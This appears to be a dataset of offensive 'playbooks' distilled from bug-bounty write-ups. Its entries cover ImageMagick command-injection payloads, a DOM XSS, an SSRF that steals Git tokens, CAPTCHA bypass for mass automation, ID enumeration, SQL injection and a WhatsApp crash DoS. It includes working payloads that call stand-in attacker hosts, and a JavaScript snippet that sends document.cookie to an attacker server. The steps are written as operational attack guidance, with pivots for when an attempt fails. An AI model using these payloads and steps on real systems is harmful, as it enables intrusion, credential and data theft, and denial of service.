Step 4: Inspect the `window.chrome` object for any undocumented or privileged objects/functions. Specifically look for `chrome.qbox`.
Step 5: If `chrome.qbox` is found, investigate its functions, particularly `chrome.qbox.navigate`, by observing error messages to understand its expected parameters.
Step 6: Construct a JSON object for `chrome.qbox.navigate` with at least `id` and `url` parameters. Experiment with different values, especially for `url`, to trigger potential RCE.
payloads_or_patterns: Payload for XSS: Visit a website with a title like `XSS`.
Payload for EoP/Potential RCE (example based on writeup): `chrome.qbox.navigate({id: 9999, url: "<some_url_or_payload>"})`
Fingerprint for privileged context: `typeof window.chrome.edge` (should be 'object' or similar, unlike a normal website)
tools_recommended: Browser Developer Tools: For inspecting the DOM, JavaScript objects, and console output.
Burp Suite (or similar proxy): To potentially intercept or modify requests if needed, though the writeup suggests direct browser interaction.
success_indicators: Rendering of HTML tags (e.g., `<b>` or `<i>`) in the 'top sites' titles on the NTP, indicating XSS.
Successful execution of JavaScript code from the NTP context that interacts with privileged `window.chrome` objects.
Observation of unexpected behavior or error messages when calling `chrome.qbox.navigate` that reveal its functionality, potentially leading to RCE.
Any indication of navigating to or executing code from an arbitrary URL via `chrome.qbox.navigate`.
failure_indicators: HTML tags in titles are not rendered and appear as plain text: This indicates proper sanitization and the XSS vector is blocked.
`window.chrome.qbox` object or `navigate` function is not found: This specific RCE vector is not present or has been patched.
`chrome.qbox.navigate` errors out with messages that do not reveal exploitable behavior: The function may have strict validation or is not vulnerable to arbitrary navigation/execution.

Any attempt to execute code from the NTP results in a 403 Forbidden or other security-related error, indicating the browser's security mechanisms are preventing exploitation of the privileged context.

playbooks.impact: Elevation of Privilege (EoP) from a New Tab Page (a higher privileged context) to potentially execute arbitrary code (Remote Code Execution - RCE) through an undocumented API (`chrome.qbox.navigate`).
playbooks.key_lesson: Always investigate privileged browser contexts accessible from web content, as they may contain undocumented APIs that can lead to Elevation of Privilege and potential Remote Code Execution.

meta.title: Abusing ImageMagick to obtain RCE

affected_components: Image processing functionality (avatar generation, cropping, resizing)
tech_stack_fingerprints: Presence of image manipulation features (e.g., avatar uploads/cropping)
Image metadata containing 'EXtdate:modify' or similar ImageMagick-related tags

trigger_conditions.when_to_apply: When a web application processes user-uploaded images without proper sanitization or stripping of metadata, and uses ImageMagick (or a similar library like GraphicsMagick) with default delegate configurations.
prerequisites: The target application uses ImageMagick or GraphicsMagick for image processing.
The application allows users to upload or provide images that are processed server-side.
The image processing does not use the `-strip` command-line option to remove metadata.
applicability_signals: Image files processed by the server contain metadata tags like 'EXtdate:modify'.
The application provides image manipulation features like cropping or avatar generation.
The presence of SVG or MVG formats being processed by the server.
skip_if: The `-strip` command-line option is consistently used for all image processing.
All image uploads are rejected or fail to process.
The server's image processing library is not ImageMagick or GraphicsMagick.

recon_steps: Step 1: Identify endpoints that handle image uploads or processing (e.g., profile picture uploads, image resizing endpoints).
Step 2: Upload various image formats (PNG, JPG, SVG, MVG) and observe the server's response and the processed image's metadata. Look for suspicious tags like 'EXtdate:modify' or similar.
attack_steps: Step 1: Craft a malicious image file (e.g., an MVG file) containing a payload designed to exploit the ImageMagick vulnerability. This payload can include commands like 'sleep' for blind testing or system commands for direct exploitation.
Step 2: If the parameter accepting the image is base64 encoded, encode the crafted payload (e.g., MVG file content) into base64.

Step 3: Upload the malicious image file or provide the base64 encoded payload to the vulnerable endpoint. Example payload structure: `push graphic-context viewbox 0 0 200 200 fill 'url(https://attacker.com/evil.jpg"; <COMMAND> )' pop graphic-context`.

Step 4: For blind RCE, use time-based payloads (e.g., `sleep 6.0`) and monitor for delays in the server's response. For observable RCE, attempt to execute commands like `ls -la` and analyze the response or look for outbound callbacks.

Step 5: If the initial payload is not effective, experiment with different image formats (SVG, MVG), different delegates (e.g., PDF, TIFF), and alternative command injection techniques within the image metadata.
payloads_or_patterns: Exploit MVG format: `push graphic-context viewbox 0 0 200 200 fill 'url(https://<CALLBACK_SERVER>/file.jpg"; sleep 6.0)' pop graphic-context`

Exploit SVG format: `<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink= "http://www.w3.org/1999/xlink";> <image xlink:href="https://<CALLBACK_SERVER>/file.jpg&quot;| sleep &quot;6.0 " x="0" y="0" height="640px" width="480px"/> </svg>`
Base64 encoded payload example for a sleep command: `cHVzaCBncmFwaGljLWNvbnRleHQKdmlld2JveCAwIDAgMjAwIDIwMApmaWxsICd1cmwoaHR0cHM6Ly9leGFtcGxlLm9yZy92ZnFCbnJzbEpJaS8iO3NsZWVwICI2LjApJwpw`
tools_recommended: Burp Suite (for intercepting requests, modifying payloads, and monitoring callbacks)
ImageMagick command-line tools (for crafting and testing image payloads)
A collaborator server (e.g., Burp Collaborator, Interactsh) for blind RCE testing
success_indicators: A noticeable delay in the server's response when using time-based payloads (e.g., 'sleep 6.0').
Successful execution of commands observed via outbound callbacks to the attacker's collaborator server (e.g., receiving an HTTP request from the target server).
Response containing output of executed commands if the vulnerability allows for direct command output.
failure_indicators: No delay in response time when using time-based payloads → The application likely sanitizes input or doesn't use ImageMagick with vulnerable delegates. Consider other vulnerability types.
Requests failing with 4xx or 5xx errors → Check the exact payload format, encoding, and the specific vulnerable delegate type.
No outbound callbacks or command output → Verify the attack vector and payload syntax. Ensure the target's network allows outbound connections.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to run arbitrary commands, exfiltrate data, modify files, or gain a persistent foothold on the system.
playbooks.key_lesson: Always investigate image processing functionality for vulnerabilities like ImageTragick, especially when default ImageMagick configurations (delegates.xml, policy.xml) are likely in use and image metadata is not stripped.

meta.title: How we hacked one of the worlds largest Cryptocurrency Website

trigger_conditions.when_to_apply: When the target website implements a CSRF token mechanism that can be bypassed or manipulated, and exhibits unhandled exceptions or insufficient error handling that reveals database errors.
prerequisites: Attacker can intercept and modify HTTP requests.
Target website generates a CSRF token for requests.
Target website has insufficient error handling, potentially leaking database information.
applicability_signals: Requests contain a CSRF token in a hidden input field.
An endpoint exists to generate CSRF tokens.
Login forms or other sensitive POST requests are present.
Error messages in responses contain 'PDOException'.
skip_if: No CSRF token is present or required for sensitive actions.
All requests are properly sanitized and do not leak sensitive error information.
WAF blocks all suspicious requests.

recon_steps: Step 1: Identify the actual IP address of the target server using services like Censys, bypassing Cloudflare.
Step 2: Perform port scanning (e.g., Nmap) to identify open ports and services, though only port 443 was found in this case.
Step 3: Analyze the website's requests using Burp Suite to identify CSRF tokens and sensitive POST endpoints.
Step 4: Locate the endpoint responsible for generating CSRF tokens.
Step 5: Use directory busting tools (dirbuster, gobuster) with custom wordlists to find hidden directories and files.
Step 6: Analyze JavaScript files for interesting endpoints or functionality.
attack_steps: Step 1: Develop a Python script to automatically fetch the CSRF token from the token generation endpoint using `requests` and `BeautifulSoup`.
Step 2: Intercept a POST request to a sensitive endpoint (e.g., login).
Step 3: Modify the POST request data to include the fetched CSRF token, a username, password, and a crafted payload in a parameter like 'db' designed for SQL injection.
Step 4: Observe the response for specific error messages like 'PDOException' or indications of SQL execution.

Step 5: If the 'PDOException' is not present in the response, it indicates successful injection and potentially leads to RCE by leveraging database functions or command execution if the application allows it.
Step 6: Iterate on payloads for 'db' parameter to achieve RCE, potentially by exploiting vulnerabilities in how the application handles database queries or external commands.
payloads_or_patterns: SQLi Payload for 'db' parameter: 'injection; SELECT 'a' FROM users -- -' (example, specific payload for RCE would be more complex and dependent on target's SQL dialect and functions available)
Python script snippet for CSRF token retrieval (see writeup for details).
tools_recommended: Censys: For retrieving actual server IP.
Nmap: For port scanning.
Burp Suite: For intercepting and modifying HTTP requests, analyzing traffic.
Dirbuster/Gobuster: For directory and file enumeration.
Python with `requests` and `BeautifulSoup`: For automating CSRF token retrieval and request crafting.
success_indicators: Absence of 'PDOException' in the response, indicating that the injection might have succeeded or been handled differently.
Specific database error messages revealing sensitive information.
Successful execution of commands on the server (for RCE), indicated by specific output or system behavior changes.
The response text from the server contains information that should not be publicly accessible.
failure_indicators: Consistent 'PDOException' or other database errors indicating the injection is not working as expected.
Responses indicating successful login for an unprivileged user.
403 Forbidden or other access denied errors for all injection attempts.
No observable change in application behavior after sending crafted requests.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing attackers to gain full control of the system, steal sensitive user data, disrupt services, and potentially manipulate cryptocurrency transactions.
playbooks.key_lesson: Always test for SQL injection vulnerabilities in parameters that accept user input, especially when combined with mechanisms like CSRF tokens, and pay close attention to error messages for potential data leakage that can lead to more critical vulnerabilities like RCE.

meta.title: Bugbounty | A DOM XSS

tech_stack_fingerprints: response contains pdp.min.js in the path

trigger_conditions.when_to_apply: When a JavaScript file dynamically constructs an AJAX request URL using `location.pathname` and then renders the response directly to the page without proper sanitization.
prerequisites: The target application must be making AJAX GET requests to an endpoint whose URL is constructed using `location.pathname`.
applicability_signals: JavaScript code that uses `location.pathname` to build an AJAX URL.
AJAX success handler that calls a function like `PDP.AjaxResponse.showProductRedemption(res)` which likely injects `res` into the DOM.
skip_if: The `location.pathname` is not used in AJAX URL construction.
The AJAX response is not rendered directly to the DOM or is properly sanitized.

recon_steps: Step 1: Identify JavaScript files in the application's source code that might be responsible for handling user interactions or fetching data via AJAX. Look for files like 'pdp.min.js'.
Step 2: Analyze the identified JavaScript files for patterns where `location.pathname` is used to construct URLs for AJAX requests, especially GET requests that fetch HTML content.
attack_steps: Step 1: Craft a malicious `location.pathname` that redirects the browser to an attacker-controlled domain. For example, setting `location.pathname` to `//attacker-controlled-domain.com/some/path`.

Step 2: The browser will attempt to fetch content from `https://attacker-controlled-domain.com/some/path` via AJAX, as indicated by the `url` variable construction: `prefix + "/showProductRedemption?productCode=" + vpCode;` where `prefix` is `location.pathname`.
Step 3: Host a simple web server at `attacker-controlled-domain.com` that serves an HTML response containing an XSS payload (e.g., `<script>alert(1)</script>`).
Step 4: When the victim visits the crafted URL (e.g., `https://www.xxxxx.com//attacker-controlled-domain.com/xxxxxxxxx`), the AJAX request will fetch the payload from the attacker's server.

Step 5: The `success` callback in the AJAX call will process the response (`res`), and if `PDP.AjaxResponse.showProductRedemption(res)` injects the response directly into the DOM, the XSS payload will execute.
tools_recommended: Burp Suite: To host the attacker-controlled domain and serve the malicious response. Alternatively, a simple Python HTTP server can be used.
Browser Developer Tools: To inspect `location.pathname` and AJAX requests.
success_indicators: An alert box pops up with the message 'XSS' (or the defined payload) in the victim's browser.
The attacker's server logs indicate a successful HTTP GET request from the target domain.
failure_indicators: The browser does not navigate to the attacker's domain or fetches content from the original domain. This could indicate that `location.pathname` is not correctly controlled or that the AJAX URL is sanitized. Pivot: Investigate other JavaScript variables or DOM manipulation functions.

The AJAX request fails with a CORS error or a 404. Pivot: Ensure the attacker's domain and path are accessible and correctly configured. Check the `Access-Control-Allow-Origin` header on the attacker's server if necessary.

playbooks.impact: Execution of arbitrary JavaScript code in the context of the victim's browser session on the target domain, allowing for session hijacking, credential theft, or further exploitation.
playbooks.key_lesson: Always sanitize or validate data sourced from `location.pathname` before using it to construct URLs for AJAX requests or when rendering responses to the DOM, as it can be controlled by the attacker.

meta.title: reCAPTCHA Exploits

tech_stack_fingerprints: Presence of reCAPTCHA widget (checkbox with 'I'm not a robot' text)
reCAPTCHA puzzle challenges (e.g., 'select all images with traffic lights')

trigger_conditions.when_to_apply: When a website utilizes Google reCAPTCHA with its 'easy' security setting, allowing repeated automated actions after a single successful human verification.
prerequisites: The target website implements Google reCAPTCHA.
The reCAPTCHA implementation uses the 'easy' difficulty setting.
applicability_signals: Users only have to solve the captcha once, and subsequent CAPTCHAs are not presented shortly after.
Automated scripts can perform multiple actions without re-verification after an initial solve.
skip_if: The website uses reCAPTCHA with 'strict' or 'medium' security settings, where users frequently encounter puzzles.
All actions require a CAPTCHA solve, even within a short timeframe.

recon_steps: Step 1: Identify websites implementing Google reCAPTCHA by looking for the 'I'm not a robot' checkbox and associated JavaScript.
Step 2: Observe the reCAPTCHA behavior. If users only need to solve a puzzle once and can then perform multiple automated actions without further challenges, the 'easy' setting is likely in use.
attack_steps: Step 1: Automate actions that are protected by reCAPTCHA. This typically involves repeated submissions of forms, uploads, or API calls.
Step 2: Initially solve the reCAPTCHA manually or via an automation tool (e.g., by integrating with a CAPTCHA solving service).
Step 3: After the initial solve, the automated script continues to perform the target actions repeatedly. The exploit relies on reCAPTCHA not presenting a new challenge due to the 'easy' setting.
payloads_or_patterns: Automated scripts (e.g., Python with Selenium or similar libraries) designed to repeatedly submit forms or perform actions. Actual payloads depend on the target website's functionality (e.g., repeated file uploads, form submissions).
tools_recommended: Selenium: For browser automation to interact with reCAPTCHA and submit forms.
CAPTCHA solving services (e.g., 2Captcha, Anti-Captcha): To solve the initial reCAPTCHA challenge.
success_indicators: The automated script successfully performs a large volume of actions (e.g., uploads, submissions) without encountering any further reCAPTCHA challenges after the initial solve.
Monitoring the target system for abuse that bypasses normal reCAPTCHA protections (e.g., mass creation of spam accounts, bulk fraudulent submissions).
failure_indicators: The reCAPTCHA presents new puzzles for subsequent actions shortly after the initial solve. This indicates the 'easy' setting is not being used or the token has expired. Pivot: Look for other CAPTCHA bypass techniques or vulnerabilities.

playbooks.impact: Allows attackers to automate a high volume of actions that are normally rate-limited or prevented by CAPTCHAs. This can lead to mass account creation, spamming, fraudulent transactions, denial of service through resource exhaustion, or other abuse depending on the target website's functionality.
playbooks.key_lesson: When encountering reCAPTCHA, investigate the 'difficulty' or 'security' setting used. If the 'easy' mode is identified, leverage it to perform automated actions repeatedly after a single human verification.

meta.title: Bypassing Captcha !

tech_stack_fingerprints: signup, login, password reset pages contain CAPTCHAs

trigger_conditions.when_to_apply: When a web application uses a CAPTCHA on the sign-in page and the CAPTCHA response is not validated server-side.
prerequisites: Target application has a sign-in page with a CAPTCHA.
applicability_signals: Sign-in button is disabled until CAPTCHA is solved.
Inspecting the network request on sign-in reveals a 'captcha-response' parameter.
skip_if: CAPTCHA is enforced client-side only and not sent in the request.
Server-side validation correctly checks the CAPTCHA response.

recon_steps: Step 1: Navigate to the sign-in page of the target application and observe the CAPTCHA implementation.
Step 2: Use browser developer tools (e.g., Burp Suite) to capture the HTTP request when attempting to log in.
Step 3: Analyze the captured request for parameters related to CAPTCHA verification, such as 'captcha-response'.
attack_steps: Step 1: Attempt to submit the sign-in request with the 'captcha-response' parameter removed or empty.
Step 2: Observe the server's response. If the application proceeds to log you in or redirects to the dashboard, the CAPTCHA is not being validated server-side.
payloads_or_patterns: Remove the `captcha-response` parameter from the POST request to the sign-in endpoint.
tools_recommended: Burp Suite: Intercept and modify HTTP requests to remove the 'captcha-response' parameter.
success_indicators: Successful login and redirection to the dashboard without providing a valid CAPTCHA response.
The server does not return an error related to an invalid or missing CAPTCHA.
failure_indicators: The server returns an error indicating an invalid or missing CAPTCHA.
The sign-in button remains disabled or the login fails with a CAPTCHA-related error message, even after removing the parameter.

playbooks.impact: Unauthorized access to user accounts, bypassing security controls meant to prevent automated abuse and credential stuffing.
playbooks.key_lesson: Always verify CAPTCHA validation server-side by attempting to bypass the client-side checks, as the response parameter might be ignored.

meta.title: An experience with Daimler’s vulnerability reporting program

target_profile.technology: Oracle Service Cloud (implied by custhelp.com domain and functionality)

trigger_conditions.when_to_apply: When a web application exposes content via predictable numerical IDs in the URL and these IDs are not properly validated or secured against enumeration.
prerequisites: Targeted website is accessible via the internet.
Content or sensitive information is exposed via URLs with numerical identifiers.
applicability_signals: URL structure contains a predictable numerical ID (e.g., /app/answers/detail/a_id/3553)
Responses to requests with different numerical IDs vary (some yield content, others redirect or show errors).
skip_if: All attempts to access resources with varying IDs result in consistent errors or unauthorized access messages.
The system implements strict rate limiting that prevents bulk enumeration.

recon_steps: Step 1: Perform Google Dorking using site:mercedes-benz-dealer.custhelp.com to discover indexed content, specifically looking for URL patterns related to content retrieval (e.g., 'answers', 'detail', 'a_id').
Step 2: Identify URLs with numerical identifiers within the discovered indexed content.
attack_steps: Step 1: Send GET requests to the '/app/answers/detail/' endpoint, substituting sequential or enumerated numerical IDs for the placeholder.
Step 2: Analyze responses for content that is returned (e.g., downloadable PDFs) as an indicator of success.
Step 3: Send GET requests to the '/ci/fattach/get/' endpoint, substituting sequential or enumerated numerical IDs for the placeholder.
Step 4: Analyze responses for downloadable attachments or content as an indicator of success.
tools_recommended: Burp Suite Intruder: To automate the enumeration of numerical IDs for both '/app/answers/detail/' and '/ci/fattach/get/' endpoints.
Google Search: For initial reconnaissance and discovery of indexed content.
success_indicators: Successful download of PDF documents from the '/app/answers/detail/' endpoint.
Successful download of attachment files from the '/ci/fattach/get/' endpoint.
Response contains HTTP headers indicating a PDF or attachment content type.
Web browser successfully renders or prompts for download of the retrieved file.
failure_indicators: Consistently receiving login prompts for all enumerated IDs (suggests a strong authentication wall).
Consistently receiving 'Not Found' or generic error pages for all enumerated IDs (suggests IDs are not sequentially predictable or the endpoint is not vulnerable).
WAF blocking requests after a few enumeration attempts (suggests rate limiting or bot detection is in place).

playbooks.impact: Disclosure of sensitive and confidential documents intended only for dealership management, including potential personal information such as cell phone numbers of company management. Documents could span over a decade of historical data.
playbooks.key_lesson: Always test predictable numerical identifiers in URLs for enumeration vulnerabilities, especially when accessing documents or attachments, as they can lead to the disclosure of sensitive information.

meta.title: SSRF in Google Cloud Platform StackDriver

trigger_conditions.when_to_apply: When a user is debugging code in Google Cloud Platform Stackdriver and has integrated with third-party code repositories like Bitbucket, GitLab, or GitHub.
prerequisites: An existing App Engine application deployed.
User has integrated Bitbucket, GitLab, or GitHub account with Stackdriver Debug.
applicability_signals: Presence of the endpoint /m/clouddiag/debug/v2/gitlab/resourcelist
The endpoint accepts a `url` parameter.
The `url` parameter is used to fetch resources from third-party Git services.
skip_if: Backend validation checks the `Referer` header to ensure it matches console.cloud.google.com.
Backend validation checks for specific request headers like `x-pan-versionid` or `X-Goog-Request-Log-Data`.

recon_steps: Navigate to the Stackdriver Debug page in Google Cloud Console.
Observe the network requests made when selecting a source from Bitbucket, GitLab, or GitHub. Pay attention to requests containing `gitlab/resourcelist` or similar paths with a `url` parameter.
attack_steps: Identify the endpoint used to fetch repository resources, e.g., `https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=<PROJECT_ID>&url=<REPO_URL>`.
Craft a malicious URL by replacing the `url` parameter's value with an attacker-controlled domain (e.g., a Burp Collaborator or attacker's server).
Send the crafted URL to a victim who has integrated their Git repository with Stackdriver.
Monitor the attacker-controlled server for incoming HTTP requests.
tools_recommended: Burp Suite (for Collaborator or setting up a listener)
A custom HTTP server to capture requests
success_indicators: An HTTP request is received at the attacker-controlled server (e.g., Burp Collaborator).
The incoming request includes an `Authorization: Bearer <ACCESS_TOKEN>` header, containing the victim's access token for the Git service.
failure_indicators: No HTTP request is received at the attacker-controlled server, or the request does not contain the access token. This might indicate backend validation is in place (e.g., blocking requests to arbitrary domains or checking specific headers). If this happens, try enumerating different Git provider APIs or looking for other SSRF vectors.
A 4xx or 5xx error response from the target URL indicates that the SSRF might be blocked by a firewall or WAF. Try using different protocols (if applicable) or encoding techniques.

playbooks.impact: An attacker can steal sensitive access tokens for Bitbucket, GitLab, or GitHub from authenticated Google Cloud Platform users, potentially leading to unauthorized access to their code repositories and other associated services.
playbooks.key_lesson: Always validate and sanitize user-controlled URL parameters that are used in server-side requests to external services, especially when those requests include sensitive authentication tokens.

meta.title: Javascript Anti Debugging - Abusing SourceMappingURL

target_profile.technology: Web Browsers (Chrome, Safari, Firefox, Edge, Opera)
tech_stack_fingerprints: Presence of `//# SourceMappingURL=` comment in JS files

trigger_conditions.when_to_apply: This technique is applicable when the target website serves JavaScript files that contain a `//# SourceMappingURL=` directive, and the user has browser developer tools open.
prerequisites: The target website serves JavaScript files.
Developer Tools are open in the user's browser.
applicability_signals: JavaScript file ending with `.js` contains a comment line starting with `//# SourceMappingURL=`
The URL specified in `SourceMappingURL` is controllable or can be influenced by attacker-controlled input within the JavaScript context.
skip_if: No JavaScript files contain the `//# SourceMappingURL=` comment.
The `SourceMappingURL` directive is hardcoded and not dynamically generated or influenced by attacker input.

recon_steps: Step 1: Analyze JavaScript files served by the target website for the presence of `//# SourceMappingURL=` comments.
Step 2: Identify if the URL in the `SourceMappingURL` comment is static or if parts of it can be influenced by user input or JavaScript execution context.
attack_steps: Step 1: Inject or create JavaScript code that dynamically sets the `SourceMappingURL` directive to a controlled URL, including data to be exfiltrated.
Step 2: Utilize a JavaScript function or injected script to construct a `//# SourceMappingURL=` comment pointing to an attacker-controlled endpoint.
Step 3: Append this script to the document's head. The browser will silently make a request to the specified `SourceMappingURL` URL.
Step 4: Ensure the response is handled by the browser itself (as it's a map file fetch) and the request data is encoded in the URL parameters.
Step 5: Monitor the attacker-controlled endpoint for incoming requests containing the exfiltrated data.
payloads_or_patterns: function smap(url, data) { const script = document.createElement('script'); script.textContent = `//# SourceMappingURL=${url}?data=${JSON.stringify(data)}`; document.head.appendChild(script); script.remove(); } smap('https://<ATTACKER_CONTROLLED_SERVER>/leak?cookie=', { cookie: document.cookie });
The core pattern is `//# SourceMappingURL=<URL_WITH_PARAMS>` where the URL and parameters are dynamically constructed using JavaScript.
tools_recommended: Burp Suite Collaborator: To receive the exfiltrated data via HTTP requests.
Browser Developer Tools: To inject and test JavaScript payloads.
success_indicators: An incoming HTTP request is received at the attacker-controlled server (e.g., Burp Collaborator).
The incoming request contains parameters with the exfiltrated data (e.g., cookies, timestamps, sensitive information).
failure_indicators: No requests are received at the attacker-controlled server after executing the JavaScript payload.
JavaScript execution errors occur, indicating the payload is not valid or the environment is not as expected.
The `SourceMappingURL` directive is not present or not honored by the browser (less likely if developer tools are open).

playbooks.impact: Allows attackers to exfiltrate sensitive data such as cookies, tokens, user IDs, and other dynamic information from the victim's browser, bypassing Content Security Policy (CSP) and similar security measures. This can lead to session hijacking, unauthorized access, and further compromise.
playbooks.key_lesson: Always test if dynamic JavaScript directives, especially those related to debugging or source mapping, can be manipulated to exfiltrate data or bypass security policies.

meta.title: BreakingApp – WhatsApp Crash & Data Loss Bug
meta.authors: Dikla Barda, Roman Zaikin and Yaara Shriki

trigger_conditions.when_to_apply: This technique is applicable when an attacker is a member of a WhatsApp group chat and has the ability to intercept and modify outgoing messages.
prerequisites: Attacker is a member of the target group chat.
Attacker has the ability to intercept and modify WhatsApp messages (e.g., using Burp Suite with a WhatsApp Web client).
WhatsApp version is vulnerable (prior to 2.19.58).
applicability_signals: Ability to intercept and view JSON structure of outgoing messages.
Presence of a 'participant' field in the message JSON.
skip_if: WhatsApp version is updated to 2.19.58 or later.
WAF or server-side validation prevents modification of the 'participant' field or detects malformed data.

recon_steps: Step 1: Browse to WhatsApp Web and open Chrome's DevTools.
Step 2: Set breakpoints where encryption keys are generated during the login process and obtain them.
Step 3: Obtain the 'secret' parameter from traffic in Burp Suite's Web Socket tab after the QR code is scanned.
Step 4: Set up the local Python server provided in the GitHub project.
Step 5: Use Burp Suite Extension with obtained keys and 'secret' parameter to connect to the Python server.
Step 6: Start intercepting and decrypting messages in a conversation where the attacker participates.
attack_steps: Step 1: Identify a group chat to target. Ensure the attacker is a member of this group.
Step 2: Intercept an outgoing message from the attacker within the group chat using the configured Burp Suite setup.
Step 3: Decrypt the intercepted message to view its JSON structure.
Step 4: Locate the 'participant' field within the JSON payload.
Step 5: Modify the value of the 'participant' field to a non-digit character string (e.g., '[email protected]').
Step 6: Re-encrypt and forward the modified message.

payloads_or_patterns.description: Modified participant field in JSON message payload

tools_recommended: Burp Suite (for intercepting and modifying traffic, WebSocket tab)
Chrome DevTools (for debugging and obtaining encryption keys)
WhatsApp Web Client
Python (for local server)
success_indicators: Target WhatsApp clients within the group chat crash.
Target clients enter a crash-loop upon reopening WhatsApp.
Users are unable to return to the group or use WhatsApp.
failure_indicators: Message is sent normally without any group members crashing (indicates patching or inability to modify the participant field).
Error message received indicating malformed input (WAF or server-side validation). Pivot: Try different non-digit character combinations or test other message manipulation vectors.

playbooks.impact: Causes a Denial of Service (DoS) by crashing WhatsApp on all devices within a specific group chat. The affected application enters a crash-loop, rendering it unusable for the group members until WhatsApp is reinstalled or the group is left (if possible). This can lead to data loss if unsent messages or recent activity is lost due to repeated crashes.
playbooks.key_lesson: Always test the handling of non-standard or malformed data in protocol parameters, especially those related to identifiers like phone numbers or participants, as they can lead to unexpected exceptions and denial of service vulnerabilities.
